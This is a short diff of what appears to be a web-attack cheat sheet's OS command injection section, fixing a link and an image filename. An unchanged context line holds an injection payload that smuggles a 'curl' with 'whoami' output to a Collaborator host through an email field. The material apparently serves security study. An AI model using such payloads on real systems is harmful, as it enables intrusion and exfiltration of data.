@@ -2922,7 +2922,7 @@ echo $cookie;
 ## OS Command Injection
 
 [Feedback](#feedback)  
-Output redirection[](#output-redirection)  
+[Output redirection](#output-redirection)  
 
 ### Feedback  
 
@@ -2973,7 +2973,7 @@ email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
 
 >Use working directory discovered using above `pwd` command to redirect output and read content.  
 
-![os cmd path traversal lfi](images/os-cmd-path-traversal-lfi)  
+![os cmd path traversal lfi](images/os-cmd-path-traversal-lfi.png)  
 
 >Get output file content.  
 
